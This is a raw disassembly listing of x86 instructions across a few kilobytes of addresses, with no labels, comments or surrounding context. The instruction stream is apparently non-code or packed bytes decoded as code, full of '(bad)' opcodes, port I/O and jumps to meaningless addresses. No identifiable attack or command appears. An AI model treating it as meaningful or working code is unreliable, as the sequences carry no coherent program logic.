  414fe6:	outs   dx,DWORD PTR ds:[esi]
  414fe7:	mov    edi,0x7b38d766
  414fec:	mov    dh,0x5f
  414fee:	inc    edx
  414fef:	aaa    
  414ff0:	sub    BYTE PTR [esi+0x29a6ba80],0xac
  414ff7:	or     ch,BYTE PTR [edx+0x8]
  414ffa:	dec    esp
  414ffb:	sub    ch,al
  414ffd:	add    al,0x65
  414fff:	push   esp
  415000:	pop    ds
  415001:	jnp    0x414fa0
  415003:	pop    es
  415004:	inc    esi
  415005:	jbe    0x414fbe
  415007:	adc    dl,dh
  415009:	sti    
  41500a:	mov    ds:0x58a7048f,eax
  41500f:	jmp    0xced3:0x364a3beb
  415016:	mov    al,ds:0x5adf15ba
  41501b:	xor    al,0xba
  41501d:	(bad)  
  41501e:	repz (bad) 
  415020:	ins    DWORD PTR es:[edi],dx
  415021:	aam    0x38
  415023:	adc    ebp,DWORD PTR [eax-0x7b]
  415026:	push   ds
  415027:	iret   
  415028:	(bad)  
  415029:	cs cdq 
  41502b:	fcom   QWORD PTR [eax+0x5a3644b1]
  415031:	das    
  415032:	jmp    0x7efbdb07
  415037:	inc    esi
  415038:	add    ecx,DWORD PTR [edi-0xa]
  41503b:	aaa    
  41503c:	int3   
  41503d:	(bad)
  415041:	mov    ecx,0x88499090
  415046:	retf   
  415047:	mov    dl,0x75
  415049:	xchg   edi,eax
  41504a:	arpl   WORD PTR [edx-0xf],sp
  41504d:	ins    BYTE PTR es:[edi],dx
  41504e:	out    dx,al
  41504f:	rcl    DWORD PTR [edx],cl
  415051:	aad    0xc3
  415053:	enter  0x465a,0x8c
  415057:	add    eax,0xd17b710c
  41505c:	push   edx
  41505d:	mov    ebp,0xb1575269
  415062:	push   0xb9eb700c
  415067:	pop    esp
  415068:	mov    edx,0x669eed64
  41506d:	jmp    0x415098
  41506f:	mov    BYTE PTR [esi],0x73
  415072:	(bad)  
  415073:	out    dx,al
  415074:	out    dx,eax
  415075:	mov    eax,0xce1a9e95
  41507a:	rcl    DWORD PTR [edi-0x67],0x40
  41507e:	sbb    BYTE PTR [ecx],0x61
  415081:	aaa    
  415082:	icebp  
  415083:	xor    BYTE PTR [esi-0x7da54839],dh
  415089:	and    edi,edx
  41508b:	xchg   esi,eax
  41508c:	mov    DWORD PTR [edx+0x1d095187],eax
  415092:	ficomp DWORD PTR [ebp+edi*2-0x7b]
  415096:	push   cs
  415097:	jmp    0xa4c7:0x86e2c846
  41509e:	mov    edx,0xbcd27f95
  4150a3:	mov    al,0x39
  4150a5:	fs push edx
  4150a7:	xchg   ebx,eax
  4150a8:	xlat   BYTE PTR ds:[ebx]
  4150a9:	in     eax,0x35
  4150ab:	js     0x415062
  4150ad:	in     eax,0xc6
  4150af:	and    esi,DWORD PTR [esi-0x22]
  4150b2:	inc    BYTE PTR [edx]
  4150b4:	jg     0x41504b
  4150b6:	pop    ebp
  4150b7:	shl    BYTE PTR [eax-0x7],0x56
  4150bb:	in     eax,dx
  4150bc:	cdq    
  4150bd:	mov    eax,0x219f84c9
  4150c2:	and    DWORD PTR [ebp+0x695b76c5],esp
  4150c8:	jecxz  0x4150cd
  4150ca:	mov    bl,BYTE PTR [ebx]
  4150cc:	adc    eax,0x157a5d7d
  4150d1:	(bad)  [edx-0x78dcde91]
  4150d7:	and    esi,DWORD PTR [ebx]
  4150d9:	ins    BYTE PTR es:[edi],dx
  4150da:	fcomp  QWORD PTR [edi-0x59523791]
  4150e0:	jns    0x415064
  4150e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150e3:	push   edi
  4150e4:	cld    
  4150e5:	pop    edx
  4150e6:	pop    ecx
  4150e7:	mov    fs:0xa64406d4,eax
  4150ed:	jl     0x41516e
  4150ef:	repz or eax,0x2b67a43f
  4150f5:	jnp    0x415162
  4150f7:	mov    ds:0x9346509f,eax
  4150fc:	mov    al,ds:0xc016eace
  415101:	cs fs pop eax
  415104:	test   eax,0x9c240b41
  415109:	inc    eax
  41510a:	daa    
  41510b:	iret   
  41510c:	mov    ebp,0xa0a6cdde
  415111:	loopne 0x415095
  415113:	std    
  415114:	xor    DWORD PTR [ebx+eiz*4-0x47a0bb54],esi
  41511b:	aad    0xce
  41511d:	repz test eax,0x23622ef5
  415123:	add    dl,bh
  415125:	cs icebp 
  415127:	sub    esi,DWORD PTR [ebx-0x5c]
  41512a:	sti    
  41512b:	fist   DWORD PTR [ecx-0x74cbd843]
  415131:	test   DWORD PTR [edi+0x5a095715],ebp
  415137:	cmc    
  415138:	push   esp
  415139:	sbb    DWORD PTR [ebp-0xe25b2c3],ebp
  41513f:	sti    
  415140:	cs push edx
  415142:	ror    BYTE PTR [edx],1
  415144:	scas   al,BYTE PTR es:[edi]
  415145:	cmp    BYTE PTR [ecx-0x21c91c73],al
  41514b:	jnp    0x415151
  41514d:	cmp    al,al
  41514f:	add    BYTE PTR gs:[edi+0x6d],bh
  415153:	xor    DWORD PTR [esi],ebx
  415155:	mov    DWORD PTR [esi-0x69],edx
  415158:	xchg   esp,eax
  415159:	ret    
  41515a:	add    BYTE PTR [ebx+ebx*8-0x3f],ah
  41515e:	mov    edi,0xa8d7dd76
  415163:	sar    DWORD PTR ds:0x7e466b40,0x5a
  41516a:	jg     0x4150f3
  41516c:	in     al,dx
  41516d:	cwde   
  41516e:	es ins DWORD PTR es:[edi],dx
  415170:	adc    BYTE PTR [esi+ebp*4+0x29b115a3],bl
  415177:	adc    BYTE PTR [ecx+ebx*8+0x6fd265eb],ch
  41517e:	bound  edx,QWORD PTR [ebx]
  415180:	retf   
  415181:	or     eax,0x6266369b
  415186:	addr16 sub al,0x90
  415189:	add    BYTE PTR [edi+eiz*1+0xf],cl
  41518d:	mov    al,0x52
  41518f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415190:	out    dx,al
  415191:	pop    ebp
  415192:	xlat   BYTE PTR ds:[ebx]
  415193:	fadd   DWORD PTR [ecx-0x39]
  415197:	jbe    0x4151ce
  415199:	nop
  41519a:	sub    BYTE PTR [esi+0x5b],bl
  41519d:	jno    0x41513e
  41519f:	pop    ecx
  4151a0:	je     0x4151ed
  4151a2:	mov    edi,0x4ecc1ca1
  4151a7:	lods   eax,DWORD PTR ds:[esi]
  4151a8:	add    cl,BYTE PTR [esi]
  4151aa:	mov    al,ds:0xc75893c2
  4151af:	pop    es
  4151b0:	or     eax,0x1c9411fa
  4151b5:	add    ebx,DWORD PTR [edx-0x48]
  4151b8:	and    ah,BYTE PTR ds:0x41ca2daa
  4151be:	push   eax
  4151bf:	pop    ebx
  4151c0:	in     eax,dx
  4151c1:	and    al,0xbf
  4151c3:	inc    ebp
  4151c4:	ds push es
  4151c6:	push   ds
  4151c7:	mov    eax,0x17e739ba
  4151cc:	repz (bad)
  4151cf:	sub    DWORD PTR [ebp+0x5a8d777f],esp
  4151d5:	add    al,0xb5
  4151d7:	jl     0x41524e
  4151d9:	adc    BYTE PTR [esi+eax*2],al
  4151dc:	imul   edx,DWORD PTR [ebx-0x4c],0xd3356da1
  4151e3:	pop    edx
  4151e4:	das    
  4151e5:	inc    ebp
  4151e6:	mov    al,0x88
  4151e8:	mov    bh,0x5a
  4151ea:	ja     0x4151f6
  4151ec:	sub    dl,BYTE PTR [esi+ebx*4-0x25cd34a2]
  4151f3:	push   ebp
  4151f4:	mov    ecx,0x678d26a3
  4151f9:	out    0x57,al
  4151fb:	sahf   
  4151fc:	inc    edx
  4151fd:	xor    ebp,0xbdc96d3
  415203:	mov    ebx,0xdd366863
  415208:	adc    DWORD PTR [edi-0x15],eax
  41520b:	xor    eax,0xd9d03455
  415210:	jno    0x4151d8
  415212:	fld    DWORD PTR [ebx-0x31]
  415215:	cwde   
  415216:	loopne 0x415235
  415218:	nop
  415219:	jae    0x41526d
  41521b:	inc    ebx
  41521c:	sbb    bh,cl
  41521e:	push   cs
  41521f:	add    ecx,eax
  415221:	dec    edi
  415222:	out    0xf2,eax
  415224:	mov    ds:0xde34d94a,al
  415229:	fmul   st(6),st
  41522b:	xor    al,0x8f
  41522d:	lea    esp,[ebx-0x48]
  415230:	mov    esp,ebp
  415232:	fimul  WORD PTR [ecx+0x31]
  415235:	imul   eax,DWORD PTR [ebx+0x249afaf5],0xb
  41523c:	(bad)  
  41523d:	aas    
  41523e:	jne    0x415204
  415240:	push   0x52d8fd1e
  415245:	fimul  WORD PTR [edx+eiz*1-0x634cf5b4]
  41524c:	mov    ecx,0xbd869fc3
  415251:	dec    edi
  415252:	fcomp  DWORD PTR [ebx]
  415254:	stc    
  415255:	jb     0x4152d1
  415257:	push   esi
  415258:	shl    DWORD PTR [esi],0x7f
  41525b:	pusha  
  41525c:	or     BYTE PTR [eax-0x73c7a738],bh
  415262:	call   DWORD PTR [esi-0x1ec3a40f]
  415268:	mov    DWORD PTR [ecx],edx
  41526a:	(bad)  
  41526b:	sar    dh,1
  41526d:	mov    ah,0x41
  41526f:	and    DWORD PTR [ebp+0x57cf9304],esi
  415275:	dec    ebx
  415276:	cmp    edx,esp
  415278:	and    DWORD PTR [edi],esi
  41527a:	lahf   
  41527b:	out    0x70,al
  41527d:	and    BYTE PTR [ebx],dh
  41527f:	lods   eax,DWORD PTR ds:[esi]
  415280:	or     eax,0x44dfb75a
  415285:	(bad)  
  415286:	mov    edi,0x71abb03e
  41528b:	cmc    
  41528c:	ss nop
  41528e:	jg     0x415280
  415290:	(bad)  
  415291:	ficom  WORD PTR [ebx-0x19]
  415294:	repnz retf 0x148d
  415298:	sbb    DWORD PTR [esi],ebx
  41529a:	add    eax,ecx
  41529c:	addr16 jae 0x41530a
  41529f:	outs   dx,DWORD PTR ds:[esi]
  4152a0:	aas    
  4152a1:	jp     0x41528b
  4152a3:	inc    ecx
  4152a4:	xchg   DWORD PTR [ecx+ebp*2+0x3216cd6],ecx
  4152ab:	mov    dh,dh
  4152ad:	mov    bl,0x60
  4152af:	(bad)  
  4152b0:	clc    
  4152b1:	xlat   BYTE PTR ds:[ebx]
  4152b2:	sub    al,0xa0
  4152b4:	adc    eax,0x3609dccd
  4152b9:	lods   al,BYTE PTR ds:[esi]
  4152bb:	and    al,0x85
  4152bd:	jns    0x41528f
  4152bf:	pop    ds
  4152c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152c1:	(bad)  
  4152c2:	ss mov ebx,0xd4e8ef45
  4152c8:	xor    eax,0xd7ad0db
  4152cd:	push   eax
  4152ce:	sti    
  4152cf:	test   bh,ch
  4152d1:	call   0xfc1f:0x4ef1d58
  4152d8:	sbb    BYTE PTR [ebp-0x468a846c],al
  4152de:	sahf   
  4152df:	xor    al,0x5c
  4152e1:	fcmovbe st,st(7)
  4152e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152e4:	int    0x44
  4152e6:	cmp    eax,0xd8cb6746
  4152eb:	mov    bl,0x3c
  4152ed:	sbb    bh,BYTE PTR [edi]
  4152ef:	loopne 0x415349
  4152f1:	aad    0x9
  4152f3:	jb     0x415352
  4152f5:	ds mov ebp,0x11b3efb3
  4152fb:	push   eax
  4152fc:	sub    ecx,DWORD PTR [ebx+ebp*2]
  4152ff:	or     BYTE PTR [esi+0x3b],al
  415302:	push   0x477b326b
  415307:	leave  
  415308:	mov    edx,0xf1e7475d
  41530d:	pusha  
  41530e:	add    esi,DWORD PTR [edx+0x4c]
  415311:	std    
  415312:	add    eax,0x4841a609
  415317:	mov    ds:0x6449f960,al
  41531c:	mov    eax,0xe359f026
  415321:	int3   
  415322:	push   ecx
  415323:	adc    DWORD PTR [ebp+0x5e],0x5a
  415327:	or     bl,BYTE PTR [edi]
  415329:	dec    ebp
  41532a:	or     bl,BYTE PTR [ebx]
  41532c:	jp     0x415377
  41532e:	adc    al,0xe8
  415330:	cmp    eax,0x569f32f0
  415335:	call   0x1a13:0x974359b4
  41533c:	xchg   esp,eax
  41533d:	loop   0x41538b
  41533f:	push   edx
  415340:	xor    dl,dh
  415342:	mov    ecx,0x8f442412
  415347:	mov    ecx,ebx
  415349:	sub    DWORD PTR [ebx-0x79],eax
  41534c:	pop    edx
  41534d:	test   BYTE PTR [ecx-0x76],0xa6
  415351:	xor    ebp,DWORD PTR [ecx+edx*2+0x36e9086]
  415358:	stc    
  415359:	and    al,0x4c
  41535b:	lods   eax,DWORD PTR ds:[esi]
  41535c:	or     ah,dh
  41535e:	dec    edi
  41535f:	cmp    DWORD PTR [edx-0x204fdd21],edx
  415365:	cwd    
  415367:	sub    eax,0x76cb6b62
  41536c:	add    BYTE PTR [eax+0x6d],dh
  41536f:	mov    ah,0x9d
  415371:	jno    0x4153a9
  415373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415374:	sub    bl,BYTE PTR [eax+0x3734e1ca]
  41537a:	cli    
  41537b:	mov    ds:0x4fe17660,eax
  415380:	mov    ecx,0x832406ff
  415385:	xor    BYTE PTR [eax-0x6c34cf83],ah
  41538b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41538c:	xor    eax,DWORD PTR [esi]
  41538e:	loop   0x41539f
  415390:	in     eax,0x7
  415392:	test   BYTE PTR [eax+0x343f05f9],ch
  415398:	stos   BYTE PTR es:[edi],al
  415399:	bswap  ecx
  41539b:	xchg   ebx,eax
  41539c:	jp     0x4153f4
  41539e:	mov    eax,0xec894022
  4153a3:	sbb    ebp,DWORD PTR [edi-0x12]
  4153a6:	inc    edi
  4153a7:	inc    edi
  4153a8:	xor    esp,esp
  4153aa:	and    BYTE PTR [ebx+edx*4],0xd6
  4153ae:	stos   DWORD PTR es:[edi],eax
  4153af:	jno    0x4153e1
  4153b1:	aam    0xa8
  4153b3:	inc    edx
  4153b4:	push   edx
  4153b5:	and    BYTE PTR [ecx-0x7aecbf8e],ch
  4153bb:	inc    edi
  4153bc:	call   0xd60b92a7
  4153c1:	out    dx,eax
  4153c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153c3:	rep lods al,BYTE PTR ds:[esi]
  4153c5:	mov    al,0x8d
  4153c7:	scas   al,BYTE PTR es:[edi]
  4153c8:	loopne 0x41539c
  4153ca:	in     al,dx
  4153cb:	popf   
  4153cc:	jge    0x415397
  4153ce:	ins    BYTE PTR es:[edi],dx
  4153cf:	or     dl,ch
  4153d1:	lods   al,BYTE PTR ds:[esi]
  4153d2:	jg     0x4153fb
  4153d4:	pop    ss
  4153d5:	xchg   ebp,eax
  4153d6:	jns    0x41541f
  4153d8:	inc    ecx
  4153d9:	in     eax,dx
  4153da:	push   esp
  4153db:	pop    ecx
  4153dc:	mov    ds:0x59df4739,al
  4153e1:	sbb    ebp,DWORD PTR [ebx+0xb794a84]
  4153e7:	cmp    eax,0x9472aca5
  4153ec:	mov    DWORD PTR [esi-0x2a],ebp
  4153ef:	repnz (bad) 
  4153f1:	in     al,0x30
  4153f3:	or     ebp,DWORD PTR [ebp+ebp*1-0x29]
  4153f7:	call   0xbae330d6
  4153fc:	sbb    al,0x8b
  4153fe:	sub    DWORD PTR [esi+0xc],0xdddcb120
  415405:	scas   eax,DWORD PTR es:[edi]
  415406:	push   es
  415407:	jle    0x415425
  415409:	sar    BYTE PTR [esi-0x17],cl
  41540c:	add    BYTE PTR [eax],dh
  41540e:	jmp    DWORD PTR [esi]
  415410:	mov    dh,0xcf
  415412:	test   al,0xad
  415414:	neg    DWORD PTR [ecx+0x7dfadcb1]
  41541a:	xor    eax,ecx
  41541c:	aaa    
  41541d:	adc    al,0x14
  41541f:	stos   DWORD PTR es:[edi],eax
  415420:	inc    edi
  415421:	lds    esp,FWORD PTR [edx-0x41]
  415424:	add    ecx,DWORD PTR [edi]
  415426:	sub    ch,BYTE PTR [ebx+0x55d17c56]
  41542c:	push   0x2c
  41542e:	pop    esp
  41542f:	das    
  415430:	aad    0x7b
  415432:	push   eax
  415433:	inc    edx
  415434:	int    0xa0
  415436:	push   esp
  415437:	shl    BYTE PTR [edi],0x28
  41543a:	repnz mov ebx,0xbd2ba9ca
  415440:	mov    dl,0x9f
  415442:	scas   eax,DWORD PTR es:[edi]
  415443:	outs   dx,DWORD PTR ds:[esi]
  415444:	or     eax,0x8656e4f2
  415449:	or     bl,BYTE PTR [edx]
  41544b:	out    0xd8,al
  41544d:	cmp    bh,BYTE PTR [eax]
  41544f:	dec    ebp
  415450:	add    DWORD PTR [esi],ecx
  415452:	xabort 0x1e
  415455:	rol    BYTE PTR [edi],1
  415457:	(bad)  
  415458:	aam    0x63
  41545a:	mov    ecx,0xfba46680
  41545f:	mov    ds:0xafc699a0,eax
  415464:	sub    dl,BYTE PTR [esi-0x7]
  415467:	repz gs sti 
  41546a:	outs   dx,BYTE PTR ds:[esi]
  41546b:	ret    0x4dcd
  41546e:	mov    eax,ds:0x9761c166
  415473:	sti    
  415474:	dec    edx
  415475:	arpl   dx,cx
  415477:	xchg   DWORD PTR [eax],ebx
  415479:	xchg   edi,eax
  41547a:	into   
  41547b:	rcl    BYTE PTR [eax-0x68],cl
  41547e:	popa   
  41547f:	icebp  
  415480:	jno    0x415446
  415482:	mov    ds:0xbc888537,al
  415487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415488:	xchg   ebx,eax
  415489:	fldl2t 
  41548b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41548c:	mov    bh,0x9a
  41548e:	mov    ebp,0xf7632586
  415493:	and    DWORD PTR [edx+esi*2],ebp
  415496:	(bad)
  415499:	cli    
  41549a:	loope  0x4154e4
  41549c:	aas    
  41549d:	xchg   edi,eax
  41549e:	push   ebx
  41549f:	push   ss
  4154a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154a1:	in     eax,0x63
  4154a3:	into   
  4154a4:	mov    bh,0xde
  4154a6:	sbb    bh,bh
  4154a8:	sub    al,0x88
  4154aa:	sub    DWORD PTR [edx+0x8],ebp
  4154ad:	xor    cl,0xef
  4154b0:	or     al,0x7
  4154b2:	das    
  4154b3:	in     al,dx
  4154b4:	or     esp,ebp
  4154b6:	out    dx,eax
  4154b7:	push   es
  4154b8:	add    edx,esp
  4154ba:	mov    edx,ecx
  4154bc:	mov    al,0x23
  4154be:	or     eax,0x3df1e869
  4154c3:	mov    DWORD PTR [edi],ebx
  4154c5:	add    DWORD PTR [edx+0x26fdc74d],ecx
  4154cb:	fild   QWORD PTR [ebp*4+0x9ec295d]
  4154d2:	xlat   BYTE PTR ds:[ebx]
  4154d3:	loopne 0x415486
  4154d5:	xchg   edx,eax
  4154d6:	add    al,BYTE PTR [ecx-0x15aa45d8]
  4154dc:	aas    
  4154dd:	mov    BYTE PTR [ecx],ah
  4154df:	out    0x65,al
  4154e1:	scas   eax,DWORD PTR es:[edi]
  4154e2:	sub    al,0x2f
  4154e4:	cdq    
  4154e5:	push   eax
  4154e6:	shr    bh,cl
  4154e8:	cwde   
  4154e9:	int    0xb2
  4154eb:	add    eax,0x3cd02283
  4154f0:	sti    
  4154f1:	test   al,0x6e
  4154f3:	xchg   edi,eax
  4154f4:	xchg   edi,eax
  4154f5:	adc    BYTE PTR [ebx+esi*8],0x4d
  4154f9:	pop    esp
  4154fa:	ja     0x4154cb
  4154fc:	jne    0x4154e3
  4154fe:	dec    ecx
  4154ff:	add    al,0x2b
  415501:	ins    BYTE PTR es:[edi],dx
  415502:	adc    DWORD PTR [esi+0x19],0x71
  415506:	into   
  415507:	xchg   ecx,eax
  415508:	jecxz  0x415503
  41550a:	packuswb mm6,QWORD PTR [eax-0x16]
  41550e:	mov    cl,0xa4
  415510:	jle    0x415558
  415512:	fdivr  QWORD PTR [esi+0x11]
  415515:	xor    al,0xf9
  415517:	pop    ds
  415518:	in     al,0x43
  41551a:	adc    BYTE PTR ds:[esi+0x47],bh
  41551e:	sub    al,0xd2
  415520:	fcmove st,st(5)
  415522:	ins    DWORD PTR es:[edi],dx
  415523:	or     eax,0xb0097865
  415528:	cmp    bl,BYTE PTR ss:[edi+0x31]
  41552c:	sub    DWORD PTR ds:0xdfb2bb97,esi
  415532:	leave  
  415533:	xchg   esi,eax
  415534:	xchg   edi,eax
  415535:	in     eax,dx
  415536:	xchg   ecx,eax
  415537:	into   
  415538:	push   es
  415539:	jg     0x41559f
  41553b:	xchg   ecx,eax
  41553c:	into   
  41553d:	test   BYTE PTR [ebp+0x519aff61],0xd2
  415544:	mov    al,0x7d
  415546:	or     al,0x5f
  415548:	into   
  415549:	xor    dh,cl
  41554b:	scas   eax,DWORD PTR es:[edi]
  41554c:	ret    
  41554d:	rol    DWORD PTR [edx+0x4a343504],0x84
  415554:	bound  ebx,QWORD PTR [ebp+eax*4+0x5c6cc2c5]
  41555b:	pop    ecx
  41555c:	adc    dh,ah
  41555e:	mov    dl,0xa1
  415560:	xchg   esi,eax
  415561:	xchg   edx,eax
  415562:	je     0x415523
  415564:	test   BYTE PTR [ecx-0x53],bh
  415567:	fist   DWORD PTR [ebx+esi*8-0x3e9d340d]
  41556e:	ja     0x4155bc
  415570:	inc    esi
  415571:	jg     0x415585
  415573:	pushf  
  415574:	sar    DWORD PTR ds:0xde00121e,cl
  41557a:	call   0xd04e452b
  41557f:	in     eax,0x5c
  415581:	mov    dh,0x87
  415583:	je     0x4155ee
  415585:	jb     0x4155bf
  415587:	sbb    bh,BYTE PTR [edi-0x214feb1e]
  41558d:	aam    0x84
  41558f:	xor    esp,esi
  415591:	xor    eax,0x17150c9e
  415596:	fwait
  415597:	push   ecx
  415598:	add    al,0x4e
  41559a:	pop    ecx
  41559b:	test   BYTE PTR [ebx+ebp*1],0x4d
  41559f:	jmp    0x4155cb
  4155a1:	pop    ebx
  4155a2:	dec    ebp
  4155a3:	and    al,0x16
  4155a5:	cmp    al,0x9a
  4155a7:	repz ds pop ebx
  4155aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155ab:	pop    esp
  4155ac:	push   eax
  4155ad:	pop    edx
  4155ae:	mov    eax,0x428578a9
  4155b3:	jle    0x41558b
  4155b5:	dec    esp
  4155b6:	xor    al,0x2c
  4155b8:	sbb    DWORD PTR [edi+ebp*4],edi
  4155bb:	fcmovb st,st(4)
  4155bd:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4155bf:	mov    ds:0xa95e55ee,al
  4155c4:	fs xchg esi,eax
  4155c6:	xor    ecx,DWORD PTR [edi]
  4155c8:	jg     0x41559d
  4155ca:	push   ss
  4155cb:	or     al,0x63
  4155cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ce:	test   bl,bl
  4155d0:	push   ds
  4155d1:	sub    esi,0x8abd4730
  4155d7:	aaa    
  4155d8:	add    BYTE PTR [ebx-0x44],al
  4155db:	sub    dh,0x98
  4155de:	pop    edx
  4155df:	lds    edx,FWORD PTR [esi]
  4155e1:	mov    dl,0x3b
  4155e3:	dec    edx
  4155e4:	(bad)  
  4155e5:	enter  0xb4b9,0x8e
  4155e9:	or     BYTE PTR [edx+0x5dcc9f88],al
  4155ef:	aad    0x34
  4155f1:	jle    0x4155d5
  4155f3:	mov    eax,0x6aef4b34
  4155f8:	(bad)  
  4155f9:	int3   
  4155fa:	inc    ecx
  4155fb:	icebp  
  4155fc:	mov    esp,DWORD PTR [eax]
  4155fe:	pop    ds
  4155ff:	(bad)  
  415600:	imul   esp,DWORD PTR [eax-0x37de7a7],0x35
  415607:	pop    esp
  415608:	lock mov eax,0xe52cd1e2
  41560e:	fisubr DWORD PTR [edi+0x72]
  415611:	adc    dh,bh
  415613:	xor    DWORD PTR [eax+eax*2-0x17d76753],ebp
  41561a:	cmp    DWORD PTR [esi-0x1d],edi
  41561d:	lahf   
  41561e:	mov    ecx,0xa189d831
  415623:	int    0x85
  415625:	les    esi,FWORD PTR [ebp-0x40]
  415628:	pusha  
  415629:	(bad)
  41562d:	xlat   BYTE PTR ds:[ebx]
  41562e:	jp     0x415619
  415630:	out    0xcc,al
  415632:	test   al,0x90
  415634:	jo     0x4155b7
  415636:	jb     0x4155fa
  415638:	mov    DWORD PTR [esi+0x4f172123],esi
  41563e:	push   ebx
  41563f:	mov    edi,0xf14a3af6
  415644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415645:	mov    al,ds:0x1261649c
  41564a:	stos   BYTE PTR es:[edi],al
  41564b:	jecxz  0x415628
  41564d:	ds out 0xd2,eax
  415650:	adc    DWORD PTR [ebx+0x2fe74ee2],ebx
  415656:	cmp    eax,0x90770b8e
  41565b:	mov    ecx,0x4fa27037
  415660:	or     eax,0xb10f3561
  415665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415666:	inc    edi
  415667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415668:	shr    DWORD PTR ds:[ecx],cl
  41566b:	push   cs
  41566c:	sub    al,0xc7
  41566e:	mov    ds:0xf2576764,al
  415673:	or     esi,DWORD PTR [esi+edx*8+0x64d165dc]
  41567a:	inc    ebx
  41567b:	ret    0xb5e9
  41567e:	jle    0x41569b
  415680:	fucomi st,st(2)
  415682:	out    dx,al
  415683:	aaa    
  415684:	shl    BYTE PTR ds:0x5542e628,0x52
  41568b:	scas   eax,DWORD PTR es:[edi]
  41568c:	pop    eax
  41568d:	jne    0x41560f
  41568f:	in     al,dx
  415690:	inc    edx
  415691:	arpl   WORD PTR [edx-0x75],ax
  415694:	push   ebp
  415695:	dec    eax
  415696:	sub    al,0x90
  415698:	dec    ebp
  415699:	add    edi,esi
  41569b:	gs lock adc eax,0xd4074afa
  4156a2:	es dec edx
  4156a4:	jno    0x41563b
  4156a6:	dec    ecx
  4156a7:	inc    eax
  4156a8:	add    dl,BYTE PTR [ebp-0x3ca04ae2]
  4156ae:	jmp    0x41569c
  4156b0:	cmp    ah,BYTE PTR es:[ebp-0x62a4e792]
  4156b7:	adc    esp,DWORD PTR [edi+0xaa04067]
  4156bd:	lahf   
  4156be:	adc    al,cl
  4156c0:	lahf   
  4156c1:	test   DWORD PTR [ebp+eiz*2-0x75],ecx
  4156c5:	mov    esi,edi
  4156c7:	jbe    0x41565a
  4156c9:	xchg   DWORD PTR [edx],ecx
  4156cb:	push   edx
  4156cc:	mov    eax,0xc4b9e969
  4156d1:	pusha  
  4156d2:	add    DWORD PTR [ecx],edx
  4156d4:	pushf  
  4156d5:	adc    DWORD PTR [esi-0x10],0xffffffde
  4156d9:	rol    DWORD PTR [edi-0x6f4b4ac0],0xf3
  4156e0:	mov    ebx,0x4d684fa9
  4156e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156e6:	cs pop ds
  4156e8:	jmp    0x5431645a
  4156ed:	test   BYTE PTR [ebp+0x1c],ah
  4156f0:	jg     0x4156b3
  4156f2:	mov    ebp,0x2c0c29eb
  4156f7:	and    ah,BYTE PTR [eax+edi*8]
  4156fa:	fwait
  4156fb:	pop    ds
  4156fc:	pop    esi
  4156fd:	js     0x415680
  4156ff:	push   cs
  415700:	or     bl,BYTE PTR [edx-0x2ea025f8]
  415706:	add    BYTE PTR [ebp-0x181e8646],dl
  41570c:	and    DWORD PTR [ecx+0x299be7fc],eax
  415712:	shl    DWORD PTR [edi-0x1a],0x4
  415716:	jno    0x41572b
  415718:	jbe    0x41577a
  41571a:	fdiv   st,st(7)
  41571c:	mov    ds,WORD PTR [ecx+ecx*8+0xb51a357]
  415723:	inc    ecx
  415724:	push   ds
  415725:	out    0xb4,al
  415727:	je     0x415722
  415729:	adc    ebp,DWORD PTR [ebx-0x12257e5b]
  41572f:	add    al,0x15
  415731:	mov    fs,esp
  415733:	dec    esp
  415734:	or     ecx,edi
  415736:	int3   
  415737:	mov    al,0x8e
  415739:	or     BYTE PTR [eax+ecx*1+0xf],cl
  41573d:	cmc    
  41573e:	push   ebx
  41573f:	lahf   
  415740:	jne    0x415736
  415742:	push   ecx
  415743:	adc    DWORD PTR [ebp-0x2a65660d],eax
  415749:	in     eax,dx
  41574a:	mov    cl,0x4e
  41574c:	std    
  41574d:	popf   
  41574e:	sbb    bl,bh
  415750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415751:	mov    esp,0x3cc69e75
  415756:	adc    BYTE PTR [eax-0x22740a67],bh
  41575c:	inc    ecx
  41575d:	int    0x8
  41575f:	mov    eax,0xb8073835
  415764:	in     al,0x45
  415766:	in     al,dx
  415767:	das    
  415768:	dec    edi
  415769:	andps  xmm1,XMMWORD PTR [ebx]
  41576c:	jg     0x4157e9
  41576e:	fist   WORD PTR [edi-0x3]
  415771:	xor    edx,ecx
  415773:	int3   
  415774:	push   edi
  415775:	stos   BYTE PTR es:[edi],al
  415776:	push   ds
  415777:	stos   BYTE PTR es:[edi],al
  415778:	pop    ss
  415779:	xchg   WORD PTR [edx],di
  41577c:	xchg   ebx,eax
  41577d:	icebp  
  41577e:	bound  edi,QWORD PTR [ecx+edx*8+0xe]
  415782:	push   es
  415783:	jbe    0x41570f
  415785:	in     al,dx
  415786:	js     0x4157e1
  415788:	jmp    0x6a82:0x8cf318b8
  41578f:	inc    edx
  415790:	xor    al,0xf2
  415792:	je     0x41574f
  415794:	dec    edi
  415795:	cld    
  415796:	or     eax,0xdac40c08
  41579b:	mov    WORD PTR [edx+eiz*2],gs
  41579e:	mov    ds:0xf61d1bb2,al
  4157a3:	pop    edx
  4157a4:	sub    eax,0x16b56feb
  4157a9:	mov    ecx,0xf7f7f4c
  4157ae:	fsubr  DWORD PTR [edi]
  4157b0:	mov    eax,0xc07c516a
  4157b5:	adc    eax,0x73efec20
  4157ba:	and    BYTE PTR [edi+0x48d31526],dl
  4157c0:	cmp    al,BYTE PTR [esi+0x423965e2]
  4157c6:	sahf   
  4157c7:	stc    
  4157c8:	sub    ebp,DWORD PTR [eax+ecx*2-0x90078eb]
  4157cf:	xchg   edi,eax
